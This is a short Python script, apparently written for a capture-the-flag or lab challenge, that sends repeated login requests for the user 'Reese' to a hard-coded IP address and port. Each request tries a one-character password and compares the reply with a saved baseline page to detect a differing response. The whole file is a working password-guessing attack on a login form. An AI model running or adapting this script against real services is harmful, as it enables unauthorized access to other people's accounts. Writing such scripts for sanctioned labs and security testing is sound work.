import requests
import sys
import time

base = open('base.txt', 'r').read().strip()


headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://165.227.225.205:31141',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://165.227.225.205:31141/login?message=Authentication%20failed',
    'Accept-Language': 'en-US,en;q=0.9',
}

for i in range(65, 100):
    data = {
      'username': 'Reese',
      'password': chr(i)
    }
    response = requests.post('http://165.227.225.205:31141/login', headers=headers, data=data, verify=False)

    if response.text.strip() != base:
        print(i)
        print(response.text.strip())

    time.sleep(0.05)
